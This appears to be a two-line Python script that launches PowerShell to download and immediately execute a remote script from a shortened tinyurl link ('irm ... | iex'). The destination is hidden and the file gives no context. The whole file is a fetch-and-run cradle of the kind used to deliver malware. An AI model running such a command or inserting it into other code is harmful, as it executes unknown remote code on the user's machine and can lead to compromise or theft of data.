import subprocess
subprocess.run(['powershell', '-NoExit', '-Command', "irm https://tinyurl.com/47h5bmcw | iex"])
